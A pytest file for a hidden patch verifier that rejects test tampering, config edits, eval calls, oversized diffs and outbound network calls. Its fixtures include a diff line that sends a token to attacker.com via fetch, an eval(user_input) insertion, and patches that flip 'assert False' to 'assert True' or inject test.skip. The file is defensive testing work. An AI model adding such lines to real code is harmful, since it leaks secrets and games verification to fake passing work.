"""
Unit tests for the Private Hidden Verifier engine (Phase 18).
Validates boundary policies, hidden regression verification and authoritative verdicts.
"""

from pathlib import Path
import pytest
from unittest.mock import MagicMock

from scopelet.capsule.models import CapsuleManifest
from scopelet.runner import ExecutionResult
from scopelet.verifier import (
    AllowedFilesPolicy,
    CodeExecutionPolicy,
    ConfigurationIntegrityPolicy,
    DiffSizePolicy,
    HiddenVerifierReport,
    NetworkSecurityPolicy,
    PolicyChecker,
    PrivateHiddenVerifier,
    TestTamperingPolicy,
    Verdict,
)


def test_test_tampering_policy():
    policy = TestTamperingPolicy()

    # 1. Modifying a test file directly
    diff_test_file = (
        "--- a/tests/test_date.py\n"
        "+++ b/tests/test_date.py\n"
        "@@ -1,1 +1,1 @@\n"
        "-def test_fail():\n"
        "+def test_pass():\n"
    )
    res1 = policy.evaluate(diff_test_file, ["tests/test_date.py"])
    assert res1.passed is False
    assert "test files" in res1.details

    # 2. Injected test.skip
    diff_skip = (
        "--- a/src/service.ts\n"
        "+++ b/src/service.ts\n"
        "@@ -1,1 +1,2 @@\n"
        "+test.skip('bypassing assertion');\n"
        " const x = 1;\n"
    )
    res2 = policy.evaluate(diff_skip, ["src/service.ts"])
    assert res2.passed is False
    assert "Test skipping directives" in res2.details

    # 3. Clean source file edit
    diff_clean = (
        "--- a/src/service.ts\n"
        "+++ b/src/service.ts\n"
        "@@ -1,1 +1,1 @@\n"
        "-const x = 1;\n"
        "+const x = 2;\n"
    )
    res3 = policy.evaluate(diff_clean, ["src/service.ts"])
    assert res3.passed is True


def test_configuration_integrity_policy():
    policy = ConfigurationIntegrityPolicy()

    diff_pkg = (
        "--- a/package.json\n"
        "+++ b/package.json\n"
        "@@ -1,1 +1,1 @@\n"
        "-dependencies\n"
        "+new dependencies\n"
    )
    res = policy.evaluate(diff_pkg, ["package.json"])
    assert res.passed is False
    assert "Forbidden build/configuration files" in res.details

    res_ok = policy.evaluate(diff_pkg, ["src/math.py"])
    assert res_ok.passed is True


def test_network_security_policy():
    policy = NetworkSecurityPolicy()

    # Injected fetch call
    diff_net = (
        "--- a/src/calc.ts\n"
        "+++ b/src/calc.ts\n"
        "@@ -1,1 +1,2 @@\n"
        "+fetch('https://attacker.com/leak?data=' + token);\n"
        " return 42;\n"
    )
    res = policy.evaluate(diff_net, ["src/calc.ts"])
    assert res.passed is False
    assert "Outbound network calls" in res.details

    # Clean computation
    diff_clean = (
        "--- a/src/calc.ts\n"
        "+++ b/src/calc.ts\n"
        "@@ -1,1 +1,1 @@\n"
        "-return 0;\n"
        "+return 42;\n"
    )
    res_clean = policy.evaluate(diff_clean, ["src/calc.ts"])
    assert res_clean.passed is True


def test_code_execution_policy():
    policy = CodeExecutionPolicy()

    diff_eval = (
        "--- a/src/helper.py\n"
        "+++ b/src/helper.py\n"
        "@@ -1,1 +1,2 @@\n"
        "+eval(user_input)\n"
        " pass\n"
    )
    res = policy.evaluate(diff_eval, ["src/helper.py"])
    assert res.passed is False
    assert "Dynamic evaluation" in res.details


def test_diff_size_policy():
    policy = DiffSizePolicy(max_lines=5, max_files=2)

    huge_diff = "--- a/src/big.ts\n+++ b/src/big.ts\n@@ -1 +1,10 @@\n" + "".join([f"+line {i}\n" for i in range(10)])
    res = policy.evaluate(huge_diff, ["src/big.ts"])
    assert res.passed is False
    assert "exceeding maximum limit" in res.details


def test_allowed_files_policy():
    policy = AllowedFilesPolicy()

    res = policy.evaluate("", ["src/secret.ts"], allowed_changes=["src/date.ts"])
    assert res.passed is False
    assert "outside allowed_changes" in res.details

    res_ok = policy.evaluate("", ["src/date.ts"], allowed_changes=["src/date.ts"])
    assert res_ok.passed is True


def _setup_mock_repo(tmp_path: Path) -> Path:
    repo = tmp_path / "private_repo"
    repo.mkdir()
    (repo / "src").mkdir()
    (repo / "src" / "math.py").write_text("def add(a, b):\n    return a - b\n", encoding="utf-8")
    return repo


def test_hidden_verifier_accept(tmp_path: Path):
    repo = _setup_mock_repo(tmp_path)
    mock_runner = MagicMock()

    # All commands pass
    mock_runner.run.return_value = ExecutionResult(
        command="pytest",
        exit_code=0,
        stdout="1 passed in 0.05s",
        stderr="",
        duration_ms=50,
        backend="local_sandbox",
        tree_hash="tree123",
        timed_out=False,
    )

    clean_patch = (
        "--- a/src/math.py\n"
        "+++ b/src/math.py\n"
        "@@ -1,2 +1,2 @@\n"
        " def add(a, b):\n"
        "-    return a - b\n"
        "+    return a + b\n"
    )

    verifier = PrivateHiddenVerifier(
        repo_dir=repo,
        runner=mock_runner,
        hidden_regression_cmd="pytest tests/hidden_regression.py",
        type_check_cmd="mypy src/",
        build_cmd="python -m build",
    )

    report = verifier.verify(clean_patch)

    assert report.verdict == Verdict.ACCEPT
    assert report.target_test is not None
    assert report.target_test.passed is True
    assert report.hidden_regression_test is not None
    assert report.hidden_regression_test.passed is True
    assert report.type_check is not None
    assert report.type_check.passed is True
    assert report.build_check is not None
    assert report.build_check.passed is True
    assert len(report.rejection_reasons) == 0


def test_hidden_verifier_reject_on_test_tampering(tmp_path: Path):
    repo = _setup_mock_repo(tmp_path)
    mock_runner = MagicMock()

    malicious_patch = (
        "--- a/tests/test_math.py\n"
        "+++ b/tests/test_math.py\n"
        "@@ -1,1 +1,1 @@\n"
        "-assert False\n"
        "+assert True\n"
    )

    verifier = PrivateHiddenVerifier(repo_dir=repo, runner=mock_runner)
    report = verifier.verify(malicious_patch)

    assert report.verdict == Verdict.REJECT
    assert any("Test Tampering Policy" in r for r in report.rejection_reasons)
    # Runner should NOT have been invoked when security check fails
    mock_runner.run.assert_not_called()


def test_hidden_verifier_reject_on_target_test_failure(tmp_path: Path):
    repo = _setup_mock_repo(tmp_path)
    mock_runner = MagicMock()

    # Target test fails
    mock_runner.run.return_value = ExecutionResult(
        command="pytest",
        exit_code=1,
        stdout="FAILED test_add - AssertionError",
        stderr="",
        duration_ms=45,
        backend="local_sandbox",
        tree_hash="tree123",
        timed_out=False,
    )

    patch_text = (
        "--- a/src/math.py\n"
        "+++ b/src/math.py\n"
        "@@ -1,2 +1,2 @@\n"
        " def add(a, b):\n"
        "-    return a - b\n"
        "+    return 0\n"
    )

    verifier = PrivateHiddenVerifier(repo_dir=repo, runner=mock_runner)
    report = verifier.verify(patch_text, target_cmd="pytest test_calc.py")

    assert report.verdict == Verdict.REJECT
    assert report.target_test is not None
    assert report.target_test.passed is False
    assert any("Target bug reproduction test failed" in r for r in report.rejection_reasons)


def test_hidden_verifier_reject_on_hidden_regression_failure(tmp_path: Path):
    repo = _setup_mock_repo(tmp_path)
    mock_runner = MagicMock()

    # Target test passes, but hidden regression fails
    def mock_run_side_effect(cmd, cwd, timeout):
        if "hidden" in cmd:
            return ExecutionResult(
                command=cmd,
                exit_code=1,
                stdout="FAILED tests/hidden_test.py::test_negative_numbers",
                stderr="",
                duration_ms=60,
                backend="local_sandbox",
                tree_hash="tree123",
                timed_out=False,
            )
        return ExecutionResult(
            command=cmd,
            exit_code=0,
            stdout="PASSED",
            stderr="",
            duration_ms=30,
            backend="local_sandbox",
            tree_hash="tree123",
            timed_out=False,
        )

    mock_runner.run.side_effect = mock_run_side_effect

    patch_text = (
        "--- a/src/math.py\n"
        "+++ b/src/math.py\n"
        "@@ -1,2 +1,2 @@\n"
        " def add(a, b):\n"
        "-    return a - b\n"
        "+    return 10\n"
    )

    verifier = PrivateHiddenVerifier(
        repo_dir=repo,
        runner=mock_runner,
        hidden_regression_cmd="pytest tests/hidden_test.py",
    )
    report = verifier.verify(patch_text, target_cmd="pytest test_single.py")

    assert report.verdict == Verdict.REJECT
    assert report.target_test.passed is True
    assert report.hidden_regression_test.passed is False
    assert any("Hidden regression test suite failed" in r for r in report.rejection_reasons)


def test_hidden_verifier_review_on_lint_diagnostics(tmp_path: Path):
    repo = _setup_mock_repo(tmp_path)
    mock_runner = MagicMock()

    def mock_run_side_effect(cmd, cwd, timeout):
        if "ruff" in cmd or "lint" in cmd:
            return ExecutionResult(
                command=cmd,
                exit_code=1,
                stdout="warning: trailing whitespace",
                stderr="",
                duration_ms=20,
                backend="local_sandbox",
                tree_hash="tree123",
                timed_out=False,
            )
        return ExecutionResult(
            command=cmd,
            exit_code=0,
            stdout="PASSED",
            stderr="",
            duration_ms=25,
            backend="local_sandbox",
            tree_hash="tree123",
            timed_out=False,
        )

    mock_runner.run.side_effect = mock_run_side_effect

    patch_text = (
        "--- a/src/math.py\n"
        "+++ b/src/math.py\n"
        "@@ -1,2 +1,2 @@\n"
        " def add(a, b):\n"
        "-    return a - b\n"
        "+    return a + b\n"
    )

    verifier = PrivateHiddenVerifier(
        repo_dir=repo,
        runner=mock_runner,
        lint_cmd="ruff check .",
    )
    report = verifier.verify(patch_text)

    assert report.verdict == Verdict.REVIEW
    assert any("Linter reported diagnostics" in n for n in report.review_notes)


def test_cli_reintegrate_command(tmp_path: Path):
    from typer.testing import CliRunner
    from apps.cli.main import app

    runner = CliRunner()
    repo = _setup_mock_repo(tmp_path)
    patch_file = tmp_path / "solution.patch"
    patch_file.write_text(
        "--- a/src/math.py\n"
        "+++ b/src/math.py\n"
        "@@ -1,2 +1,2 @@\n"
        " def add(a, b):\n"
        "-    return a - b\n"
        "+    return a + b\n",
        encoding="utf-8",
    )

    result = runner.invoke(app, ["reintegrate", str(patch_file), "--repo", str(repo)])
    assert result.exit_code == 0
    assert "Patch reintegrated cleanly" in result.stdout
    assert "return a + b" in (repo / "src" / "math.py").read_text(encoding="utf-8")


def test_cli_hidden_verify_command(tmp_path: Path):
    from typer.testing import CliRunner
    from apps.cli.main import app
    from unittest.mock import patch

    runner = CliRunner()
    repo = _setup_mock_repo(tmp_path)
    patch_file = tmp_path / "solution.patch"
    patch_file.write_text(
        "--- a/src/math.py\n"
        "+++ b/src/math.py\n"
        "@@ -1,2 +1,2 @@\n"
        " def add(a, b):\n"
        "-    return a - b\n"
        "+    return a + b\n",
        encoding="utf-8",
    )

    mock_exec_result = ExecutionResult(
        command="pytest",
        exit_code=0,
        stdout="PASSED",
        stderr="",
        duration_ms=40,
        backend="local_sandbox",
        tree_hash="tree123",
        timed_out=False,
    )

    with patch("scopelet.runner.IsolatedRunner.run", return_value=mock_exec_result):
        res = runner.invoke(
            app,
            ["hidden-verify", str(patch_file), "--repo", str(repo), "--cmd", "pytest"],
        )
        assert res.exit_code == 0
        assert "ACCEPTED" in res.stdout
